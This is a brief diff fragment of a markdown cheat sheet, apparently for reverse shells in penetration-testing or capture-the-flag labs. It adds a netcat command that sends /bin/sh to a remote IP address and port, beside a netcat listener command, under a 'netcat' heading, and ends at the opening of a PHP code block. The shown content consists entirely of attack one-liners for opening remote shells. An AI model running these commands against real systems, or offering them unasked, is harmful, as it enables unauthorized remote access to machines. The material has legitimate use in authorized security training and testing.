@@ -120,6 +120,7 @@
 
 
 # 5. netcat <a name="nc"></a>
+- __`nc -e /bin/sh 10.10.161.13 4545`__
 - __`nc -lvnp 2323`__
 ```php
 <?php
